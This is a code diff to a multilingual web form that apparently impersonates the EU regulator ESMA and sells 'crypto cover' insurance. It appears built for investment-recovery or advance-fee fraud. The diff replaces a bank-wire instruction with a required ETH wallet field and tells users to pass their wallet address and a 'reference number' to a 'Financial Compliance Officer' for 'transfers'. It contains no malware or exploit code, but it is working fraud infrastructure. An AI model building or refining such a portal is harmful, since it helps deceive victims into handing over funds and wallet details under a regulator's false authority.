@@ -214,6 +214,14 @@ input:focus, textarea:focus, select:focus {
   box-shadow: 0 0 0 2px rgba(0, 51, 153, 0.1);
 }
 
+/* Helper Text */
+.field-note {
+  font-size: 12px;
+  color: #555;
+  margin-top: 4px;
+  font-style: italic;
+}
+
 /* Searchable Nationality Custom Dropdown */
 .custom-select-container {
   position: relative;
@@ -392,11 +400,15 @@ input:focus, textarea:focus, select:focus {
 /* Navigation Buttons */
 .nav-actions {
   display: flex;
-  justify-content: space-between;
+  justify-content: flex-end;
   align-items: center;
   margin-top: 30px;
   padding-top: 20px;
   border-top: 1px solid var(--border);
+}
+
+.nav-actions.between {
+  justify-content: space-between;
 }
 
 .btn {
@@ -518,7 +530,7 @@ input:focus, textarea:focus, select:focus {
   color: var(--eu-blue);
 }
 
-/* Footer Styles (Fixed in English) */
+/* Footer Styles */
 .esma-footer {
   background-color: #E2E2EC;
   padding: 40px 10%;
@@ -781,7 +793,6 @@ input:focus, textarea:focus, select:focus {
         </div>
 
         <div class="nav-actions">
-          <button type="button" class="btn btn-secondary" onclick="returnToClientPhase7()"><i class="fas fa-arrow-left"></i> <span data-i18n="btnReturnPhase7">Return to Deposit Selection (Phase 7)</span></button>
           <button type="button" class="btn btn-primary" onclick="nextPhase(1)"><span data-i18n="btnContinue">Continue</span> &rarr;</button>
         </div>
       </div>
@@ -830,7 +841,7 @@ input:focus, textarea:focus, select:focus {
           </label>
         </div>
 
-        <div class="nav-actions">
+        <div class="nav-actions between">
           <button type="button" class="btn btn-secondary" onclick="prevPhase(2)">&larr; <span data-i18n="btnBack">Back</span></button>
           <button type="button" class="btn btn-primary" onclick="nextPhase(2)"><span data-i18n="btnContinue">Continue</span> &rarr;</button>
         </div>
@@ -844,18 +855,9 @@ input:focus, textarea:focus, select:focus {
 
         <div class="form-grid">
           <div class="form-group full">
-            <label for="platform_name" data-i18n="lblPlatform">On Crypto Platform Name:</label>
-            <input type="text" id="platform_name" name="platform_name" placeholder="e.g. Binance, Coinbase">
-          </div>
-
-          <div class="form-group full">
-            <label for="trading_id" data-i18n="lblTradingId">Automatic Trading Account ID:</label>
-            <input type="text" id="trading_id" name="trading_id" placeholder="Account ID">
-          </div>
-
-          <div class="form-group full">
-            <label for="other_info" data-i18n="lblPublicWallet">Public Wallet Address / Other Details:</label>
-            <textarea id="other_info" name="other_info" rows="3"></textarea>
+            <label for="eth_wallet" data-i18n="lblEthWallet">Paste ETH Wallet Address:</label>
+            <input type="text" id="eth_wallet" name="eth_wallet" placeholder="0x..." required>
+            <div class="field-note" data-i18n="lblWalletNote">Note: Please provide the ETH wallet address where you will receive your funds.</div>
           </div>
 
           <div class="form-group">
@@ -873,7 +875,7 @@ input:focus, textarea:focus, select:focus {
           We applicant declare that the submitted information is true, accurate, complete and not misleading and we have disclosed any other information, which might reasonably be considered relevant for the purpose of the application.
         </div>
 
-        <div class="nav-actions">
+        <div class="nav-actions between">
           <button type="button" class="btn btn-secondary" onclick="prevPhase(3)">&larr; <span data-i18n="btnBack">Back</span></button>
           <button type="submit" class="btn btn-submit" data-i18n="btnSendRequest">Send Request</button>
         </div>
@@ -898,14 +900,14 @@ input:focus, textarea:focus, select:focus {
 
     <div class="payment-note">
       <i class="fas fa-info-circle"></i>
-      <span data-i18n="msgPaymentNote">Please provide this insurance reference number directly to your assigned Financial Compliance Officer, who will assist you in completing the bank wire transfer.</span>
+      <span data-i18n="msgPaymentNote">Please provide your ETH crypto wallet address along with this generated insurance reference number to your Financial Compliance Officer to assist with the transfers.</span>
     </div>
 
     <button class="btn btn-primary" style="width: 100%;" onclick="closeModalAndRedirect()" data-i18n="btnReturnPortal">Acknowledge & Return to Portal</button>
   </div>
 </div>
 
-<!-- Footer (Fixed in English) -->
+<!-- Footer -->
 <footer class="esma-footer">
   <div class="footer-content">
     
@@ -948,7 +950,7 @@ input:focus, textarea:focus, select:focus {
       </div>
     </div>
 
-    <!-- 2. Middle side: 6 Links in 3 Columns -->
+    <!-- 2. Middle side: Links -->
     <div class="footer-links">
       <a href="https://www.esma.europa.eu/about-esma/careers" target="_blank">Careers</a>
       <a href="support.html" target="_blank" data-i18n="ftrContact">Contact & Help</a>
@@ -1201,7 +1203,6 @@ const i18n = {
     optStudentRetired: "Student or retired",
     btnContinue: "Continue",
     btnBack: "Back",
-    btnReturnPhase7: "Return to Deposit Selection (Phase 7)",
     btnSendRequest: "Send Request",
     hdrSelectPlan: "Select Your Crypto Cover",
     lblDuration: "Duration:",
@@ -1217,9 +1218,8 @@ const i18n = {
     riskPack2: "Hacking & theft, Exchange failure, Temporary loss of access",
     riskPack3: "Hacking, theft, exchange collapse, Lost seed phrase, Wrong address transfer",
     hdrCryptoWallet: "Your Crypto Wallet",
-    lblPlatform: "On Crypto Platform Name:",
-    lblTradingId: "Automatic Trading Account ID:",
-    lblPublicWallet: "Public Wallet Address / Other Details:",
+    lblEthWallet: "Paste ETH Wallet Address:",
+    lblWalletNote: "Note: Please provide the ETH wallet address where you will receive your funds.",
     lblSignature: "Signature (Full Name):",
     lblDate: "Date:",
     declarationText: "We applicant declare that the submitted information is true, accurate, complete and not misleading and we have disclosed any other information, which might reasonably be considered relevant for the purpose of the application.",
@@ -1228,7 +1228,7 @@ const i18n = {
     lblInsuranceNum: "Insurance Number",
     btnCopy: "Copy",
     btnCopied: "Copied!",
-    msgPaymentNote: "Please provide this insurance reference number directly to your assigned Financial Compliance Officer, who will assist you in completing the bank wire transfer.",
+    msgPaymentNote: "Please provide your ETH crypto wallet address along with this generated insurance reference number to your Financial Compliance Officer to assist with the transfers.",
     btnReturnPortal: "Acknowledge & Return to Portal"
   },
   DA: {
@@ -1257,7 +1257,6 @@ const i18n = {
     optStudentRetired: "Studerende eller pensionist",
     btnContinue: "Fortsæt",
     btnBack: "Tilbage",
-    btnReturnPhase7: "Vend tilbage til valget af indbetalingsmetode (fase 7)",
     btnSendRequest: "Send anmodning",
     hdrSelectPlan: "Vælg din kryptodækning",
     lblDuration: "Varighed:",
@@ -1273,9 +1272,8 @@ const i18n = {
     riskPack2: "Hacking og tyveri, børssvigt, midlertidigt tab af adgang",
     riskPack3: "Hacking, tyveri, børskollaps, mistet seed-phrase, forkert adresseoverførsel",
     hdrCryptoWallet: "Din krypto-tegnebog",
-    lblPlatform: "Navn på krypto-platform:",
-    lblTradingId: "Automatisk handelskonto-ID:",
-    lblPublicWallet: "Offentlig wallet-adresse / Andre detaljer:",
+    lblEthWallet: "Indsæt ETH-walletadresse:",
+    lblWalletNote: "Bemærk: Angiv venligst den ETH-walletadresse, hvor du vil modtage dine midler.",
     lblSignature: "Underskrift (fulde navn):",
     lblDate: "Dato:",
     declarationText: "Vi erklærer som ansøger, at de indsendte oplysninger er sande, nøjagtige, fuldstændige og ikke vildledende, og at vi har oplyst alle andre oplysninger, der med rimelighed kan anses for relevante for ansøgningen.",
@@ -1284,7 +1282,7 @@ const i18n = {
     lblInsuranceNum: "Forsikringsnummer",
     btnCopy: "Kopier",
     btnCopied: "Kopieret!",
-    msgPaymentNote: "Angiv venligst dette forsikringsreferencenummer direkte til din tildelte Financial Compliance Officer, som vil hjælpe dig med at gennemføre bankoverførslen.",
+    msgPaymentNote: "Angiv venligst din ETH-krypto-tegnebogsadresse sammen med dette genererede forsikringsreferencenummer til din Financial Compliance Officer for at hjælpe med overførslerne.",
     btnReturnPortal: "Anerkend og vend tilbage til portalen"
   },
   DE: {
@@ -1313,7 +1311,6 @@ const i18n = {
     optStudentRetired: "Student oder Rentner",
     btnContinue: "Weiter",
     btnBack: "Zurück",
-    btnReturnPhase7: "Zurück zur Einzahlungsauswahl (Phase 7)",
     btnSendRequest: "Anfrage senden",
     hdrSelectPlan: "Wählen Sie Ihren Krypto-Schutz",
     lblDuration: "Laufzeit:",
@@ -1329,9 +1326,8 @@ const i18n = {
     riskPack2: "Hacking & Diebstahl, Börsenausfall, vorübergehender Zugriffsverlust",
     riskPack3: "Hacking, Diebstahl, Börsenkollaps, verlorene Seed-Phrase, falsche Überweisung",
     hdrCryptoWallet: "Ihre Krypto-Wallet",
-    lblPlatform: "Name der Krypto-Plattform:",
-    lblTradingId: "Automatische Trading-Konto-ID:",
-    lblPublicWallet: "Öffentliche Wallet-Adresse / Weitere Details:",
+    lblEthWallet: "ETH-Wallet-Adresse einfügen:",
+    lblWalletNote: "Hinweis: Bitte geben Sie die ETH-Wallet-Adresse an, auf der Sie Ihre Gelder empfangen möchten.",
     lblSignature: "Unterschrift (Vollständiger Name):",
     lblDate: "Datum:",
     declarationText: "Wir als Antragsteller erklären, dass die übermittelten Informationen wahr, genau, vollständig und nicht irreführend sind und dass wir alle anderen Informationen offengelegt haben, die für den Zweck des Antrags als relevant angesehen werden können.",
@@ -1340,7 +1336,7 @@ const i18n = {
     lblInsuranceNum: "Versicherungsnummer",
     btnCopy: "Kopieren",
     btnCopied: "Kopiert!",
-    msgPaymentNote: "Bitte teilen Sie diese Versicherungsreferenznummer direkt Ihrem zuständigen Financial Compliance Officer mit, der Ihnen bei der Durchführung der Banküberweisung behilflich sein wird.",
+    msgPaymentNote: "Bitte teilen Sie Ihre ETH-Krypto-Wallet-Adresse zusammen mit dieser generierten Versicherungsreferenznummer Ihrem Financial Compliance Officer mit, um Sie bei den Überweisungen zu unterstützen.",
     btnReturnPortal: "Bestätigen & zum Portal zurückkehren"
   },
   DU: {
@@ -1369,7 +1365,6 @@ const i18n = {
     optStudentRetired: "Student of gepensioneerd",
     btnContinue: "Doorgaan",
     btnBack: "Terug",
-    btnReturnPhase7: "Terug naar stortingsselectie (Fase 7)",
     btnSendRequest: "Aanvraag versturen",
     hdrSelectPlan: "Selecteer uw krypto-dekking",
     lblDuration: "Loooptijd:",
@@ -1385,9 +1380,8 @@ const i18n = {
     riskPack2: "Hacking & diefstal, beursfout, tijdelijk verlies van toegang",
     riskPack3: "Hacking, diefstal, beurscollapse, verloren seed phrase, verkeerde overboeking",
     hdrCryptoWallet: "Uw crypto-wallet",
-    lblPlatform: "Naam crypto-platform:",
-    lblTradingId: "Automatisch trading account ID:",
-    lblPublicWallet: "Publiek wallet-adres / Overige details:",
+    lblEthWallet: "Plak ETH Wallet-adres:",
+    lblWalletNote: "Opmerking: Geef het ETH-walletadres op waarop u uw geld wilt ontvangen.",
     lblSignature: "Handtekening (Volledige naam):",
     lblDate: "Datum:",
     declarationText: "Wij als aanvrager verklaren dat de verstrekte informatie juist, nauwkeurig, volledig en niet misleidend is en dat we alle andere informatie hebben bekendgemaakt die redelijkerwijs relevant kan worden geacht voor de aanvraag.",
@@ -1396,7 +1390,7 @@ const i18n = {
     lblInsuranceNum: "Verzekeringsnummer",
     btnCopy: "Kopiëren",
     btnCopied: "Gekopieerd!",
-    msgPaymentNote: "Geef dit verzekeringsreferentienummer rechtstreeks door aan uw toegewezen Financial Compliance Officer, die u zal helpen bij het voltooien van de bankoverschrijving.",
+    msgPaymentNote: "Geef uw ETH crypto-walletadres en dit gegenereerde verzekeringsreferentienummer door aan uw Financial Compliance Officer om u te helpen met de overboekingen.",
     btnReturnPortal: "Bevestigen & terugkeren naar Portal"
   },
   ES: {
@@ -1425,7 +1419,6 @@ const i18n = {
     optStudentRetired: "Estudiante o jubilado",
     btnContinue: "Continuar",
     btnBack: "Atrás",
-    btnReturnPhase7: "Volver a la selección de depósito (Fase 7)",
     btnSendRequest: "Enviar solicitud",
     hdrSelectPlan: "Seleccione su cobertura cripto",
     lblDuration: "Duración:",
@@ -1441,9 +1434,8 @@ const i18n = {
     riskPack2: "Hacking y robo, fallo de exchange, pérdida temporal de acceso",
     riskPack3: "Hacking, robo, colapso de exchange, frase semilla perdida, transferencia a dirección errónea",
     hdrCryptoWallet: "Su monedero cripto",
-    lblPlatform: "Nombre de la plataforma cripto:",
-    lblTradingId: "ID de cuenta de trading automático:",
-    lblPublicWallet: "Dirección pública de billetera / Otros detalles:",
+    lblEthWallet: "Pegue la dirección de billetera ETH:",
+    lblWalletNote: "Nota: Proporcione la dirección de billetera ETH donde recibirá sus fondos.",
     lblSignature: "Firma (Nombre completo):",
     lblDate: "Fecha:",
     declarationText: "Nosotros como solicitantes declaramos que la información presentada es verdadera, precisa, completa y no engañosa y hemos revelado cualquier otra información que pueda considerarse razonablemente relevante para la solicitud.",
@@ -1452,7 +1444,7 @@ const i18n = {
     lblInsuranceNum: "Número de seguro",
     btnCopy: "Copiar",
     btnCopied: "¡Copiado!",
-    msgPaymentNote: "Proporcione este número de referencia de seguro directamente a su Oficial de Cumplimiento Financiero asignado, quien le ayudará a completar la transferencia bancaria.",
+    msgPaymentNote: "Proporcione su dirección de billetera cripto ETH junto con este número de referencia de seguro generado a su Oficial de Cumplimiento Financiero para ayudarle con las transferencias.",
     btnReturnPortal: "Aceptar y volver al portal"
   },
   FI: {
@@ -1481,7 +1473,6 @@ const i18n = {
     optStudentRetired: "Opiskelija tai eläkeläinen",
     btnContinue: "Jatka",
     btnBack: "Takaisin",
-    btnReturnPhase7: "Palaa talletustavan valintaan (Vaihe 7)",
     btnSendRequest: "Lähetä pyyntö",
     hdrSelectPlan: "Valitse kryptosuojauksesi",
     lblDuration: "Kesto:",
@@ -1497,9 +1488,8 @@ const i18n = {
     riskPack2: "Hakkerointi ja varkaus, pörssin toimintahäiriö, tilapäinen pääsyn menetys",
     riskPack3: "Hakkerointi, varkaus, pörssin romahtaminen, kadotettu seed-lauseke, väärä osoitesiirto",
     hdrCryptoWallet: "Kryptolompakkosi",
-    lblPlatform: "Kryptoalustan nimi:",
-    lblTradingId: "Automaattisen kaupankäyntitilin ID:",
-    lblPublicWallet: "Julkinen lompakko-osoite / Muut tiedot:",
+    lblEthWallet: "Liitä ETH-lompakon osoite:",
+    lblWalletNote: "Huomautus: Ilmoita ETH-lompakon osoite, johon vastaanotat varat.",
     lblSignature: "Allekirjoitus (Koko nimi):",
     lblDate: "Päivämäärä:",
     declarationText: "Me hakijana vakuutamme, että annetut tiedot ovat totuudenmukaisia, tarkkoja, täydellisiä eivätkä harhaanjohtavia, ja olemme ilmoittaneet kaikki muut tiedot, joita voidaan kohtuudella pitää hakemuksen kannalta olennaisina.",
@@ -1508,7 +1498,7 @@ const i18n = {
     lblInsuranceNum: "Vakuutusnumero",
     btnCopy: "Kopioi",
     btnCopied: "Kopioitu!",
-    msgPaymentNote: "Ilmoita tämä vakuutuksen viitenumero suoraan nimetyille taloudelliselle vaatimustenmukaisuusvastaavallesi, joka auttaa sinua pankkisiirron suorittamisessa.",
+    msgPaymentNote: "Ilmoita ETH-kryptolompakkosi osoite ja tämä luotu vakuutusviitenumero suoraan taloudelliselle vaatimustenmukaisuusvastaavallesi siirtojen suorittamista varten.",
     btnReturnPortal: "Vahvista ja palaa portaaliin"
   },
   FR: {
@@ -1537,7 +1527,6 @@ const i18n = {
     optStudentRetired: "Étudiant ou retraité",
     btnContinue: "Continuer",
     btnBack: "Retour",
-    btnReturnPhase7: "Retour à la sélection du dépôt (Phase 7)",
     btnSendRequest: "Envoyer la demande",
     hdrSelectPlan: "Sélectionnez votre couverture crypto",
     lblDuration: "Durée :",
@@ -1553,9 +1542,8 @@ const i18n = {
     riskPack2: "Piratage et vol, défaillance de la plateforme, perte temporaire d'accès",
     riskPack3: "Piratage, vol, effondrement de plateforme, perte de phrase graine, erreur de destinataire",
     hdrCryptoWallet: "Votre portefeuille crypto",
-    lblPlatform: "Nom de la plateforme crypto :",
-    lblTradingId: "ID du compte de trading automatique :",
-    lblPublicWallet: "Adresse publique du portefeuille / Autres détails :",
+    lblEthWallet: "Coller l'adresse du portefeuille ETH :",
+    lblWalletNote: "Remarque : Veuillez fournir l'adresse du portefeuille ETH sur laquelle vous recevrez vos fonds.",
     lblSignature: "Signature (Nom complet) :",
     lblDate: "Date :",
     declarationText: "Nous demandeur déclarons que les informations soumises sont vraies, exactes, complètes et non trompeuses et que nous avons divulgué toute autre information qui pourrait raisonnablement être considérée comme pertinente aux fins de la demande.",
@@ -1564,7 +1552,7 @@ const i18n = {
     lblInsuranceNum: "Numéro d'assurance",
     btnCopy: "Copier",
     btnCopied: "Copié !",
-    msgPaymentNote: "Veuillez fournir ce numéro de référence d'assurance directement à votre responsable de la conformité financière dédié, qui vous aidera à effectuer le virement bancaire.",
+    msgPaymentNote: "Veuillez fournir votre adresse de portefeuille crypto ETH ainsi que ce numéro de référence d'assurance généré à votre responsable de la conformité financière afin de vous aider pour les transferts.",
     btnReturnPortal: "Confirmer et retourner au portail"
   },
   IT: {
@@ -1593,7 +1581,6 @@ const i18n = {
     optStudentRetired: "Studente o pensionato",
     btnContinue: "Continua",
     btnBack: "Indietro",
-    btnReturnPhase7: "Ritorna alla selezione del deposito (Fase 7)",
     btnSendRequest: "Invia richiesta",
     hdrSelectPlan: "Seleziona la tua copertura crypto",
     lblDuration: "Durata:",
@@ -1609,9 +1596,8 @@ const i18n = {
     riskPack2: "Hacking e furto, fallimento exchange, perdita temporanea di accesso",
     riskPack3: "Hacking, furto, crollo exchange, frase seed smarrita, trasferimento a indirizzo errato",
     hdrCryptoWallet: "Il tuo portafoglio crypto",
-    lblPlatform: "Nome piattaforma crypto:",
-    lblTradingId: "ID account di trading automatico:",
-    lblPublicWallet: "Indirizzo pubblico del portafoglio / Altri dettagli:",
+    lblEthWallet: "Incolla l'indirizzo del portafoglio ETH:",
+    lblWalletNote: "Nota: fornisci l'indirizzo del portafoglio ETH in cui riceverai i tuoi fondi.",
     lblSignature: "Firma (Nome completo):",
     lblDate: "Data:",
     declarationText: "Noi richiedenti dichiariamo che le informazioni inviate sono vere, accurate, complete e non fuorvianti e abbiamo divulgato qualsiasi altra informazione che potrebbe essere ragionevolmente considerata rilevante ai fini della domanda.",
@@ -1620,7 +1606,7 @@ const i18n = {
     lblInsuranceNum: "Numero di assicurazione",
     btnCopy: "Copia",
     btnCopied: "Copiato!",
-    msgPaymentNote: "Fornisci questo numero di riferimento assicurativo direttamente al tuo Financial Compliance Officer dedicato, che ti assisterà nel completare il bonifico bancario.",
+    msgPaymentNote: "Fornisci il tuo indirizzo di portafoglio crypto ETH insieme a questo numero di riferimento assicurativo generato al tuo Financial Compliance Officer per assisterti nei trasferimenti.",
     btnReturnPortal: "Conferma e torna al portale"
   },
   NO: {
@@ -1649,7 +1635,6 @@ const i18n = {
     optStudentRetired: "Student eller pensjonist",
     btnContinue: "Fortsett",
     btnBack: "Tilbake",
-    btnReturnPhase7: "Gå tilbake til valg av innskuddsmetode (Fase 7)",
     btnSendRequest: "Send forespørsel",
     hdrSelectPlan: "Velg din kryptodekning",
     lblDuration: "Varighet:",
@@ -1665,9 +1650,8 @@ const i18n = {
     riskPack2: "Hacking og tyveri, børssvikt, midlertidig tap av tilgang",
     riskPack3: "Hacking, tyveri, børskollaps, tapt seed-phrase, feil adresseoverføring",
     hdrCryptoWallet: "Din krypto-lommebok",
-    lblPlatform: "Navn på krypto-plattform:",
-    lblTradingId: "Automatisk trading-konto ID:",
-    lblPublicWallet: "Offentlig lommebokadresse / Andre detaljer:",
+    lblEthWallet: "Lim inn ETH-lommebokadresse:",
+    lblWalletNote: "Merk: Vennligst oppgi ETH-lommebokadressen der du vil motta midlene dine.",
     lblSignature: "Signatur (Fullt navn):",
     lblDate: "Dato:",
     declarationText: "Vi som søker erklærer at den innsendte informasjonen er sann, nøyaktig, fullstendig og ikke misvisende, og vi har oppgitt all annen informasjon som med rimelighet kan anses som relevant for søknaden.",
@@ -1676,7 +1660,7 @@ const i18n = {
     lblInsuranceNum: "Forsikringsnummer",
     btnCopy: "Kopier",
     btnCopied: "Kopiert!",
-    msgPaymentNote: "Vennligst oppgi dette forsikringsreferansenummeret direkte til din dedikerte Financial Compliance Officer, som vil hjelpe deg med å fullføre bankoverføringen.",
+    msgPaymentNote: "Vennligst oppgi din ETH krypto-lommebokadresse sammen med dette genererte forsikringsreferansenummeret til din Financial Compliance Officer for å hjelpe deg med overføringene.",
     btnReturnPortal: "Bekreft og gå tilbake til portalen"
   },
   SV: {
@@ -1705,12 +1689,11 @@ const i18n = {
     optStudentRetired: "Student eller pensionär",
     btnContinue: "Fortsätt",
     btnBack: "Tillbaka",
-    btnReturnPhase7: "Återvänd till val av insättning (Fas 7)",
     btnSendRequest: "Skicka begäran",
     hdrSelectPlan: "Välj ditt kryptoskydd",
     lblDuration: "Varaktighet:",
     dur1Mo: "1 månad",
-    dur6Mo: "6 månader",
+    dur6Mo: "6 måneder",
     dur12Mo: "12 månader",
     lblCoverage: "Täckning:",
     cov50k: "upp till €50 000",
@@ -1721,9 +1704,8 @@ const i18n = {
     riskPack2: "Hackning & stöld, börsfel, tillfällig förlust av åtkomst",
     riskPack3: "Hackning, stöld, börskollaps, förlorad seed-phrase, felaktig adressöverföring",
     hdrCryptoWallet: "Din krypto-plånbok",
-    lblPlatform: "Kryptoplattformens namn:",
-    lblTradingId: "Automatiskt handelskonto-ID:",
-    lblPublicWallet: "Offentlig plånboksadress / Andra detaljer:",
+    lblEthWallet: "Klistra in ETH-plånboksadress:",
+    lblWalletNote: "Obs: Ange den ETH-plånboksadress där du kommer att ta emot dina pengar.",
     lblSignature: "Signatur (Fullständigt namn):",
     lblDate: "Datum:",
     declarationText: "Vi sökande förklarar att den insända informationen är sann, korrekt, fullständig och inte vilseledande och att vi har lämnat all annan information som rimligen kan anses vara relevant för ansökan.",
@@ -1732,7 +1714,7 @@ const i18n = {
     lblInsuranceNum: "Försäkringsnummer",
     btnCopy: "Kopiera",
     btnCopied: "Kopierad!",
-    msgPaymentNote: "Vänligen ange detta försäkringsreferensnummer direkt till din utsedda Financial Compliance Officer, som hjälper dig att slutföra banköverföringen.",
+    msgPaymentNote: "Vänligen ange din ETH krypto-plånboksadress tillsammans med detta genererade försäkringsreferensnummer till din Financial Compliance Officer för att hjälpa dig med överföringarna.",
     btnReturnPortal: "Bekräfta och återvänd till portalen"
   }
 };
@@ -1890,7 +1872,6 @@ function prevPhase(fromPhase) {
   }
 }
 
-/* Safe Return to Client's Specific Database on Phase 7 */
 function returnToClientPhase7() {
   const urlParams = new URLSearchParams(window.location.search);
   let clientEmail = urlParams.get('email') || document.getElementById('email').value.trim().toLowerCase();
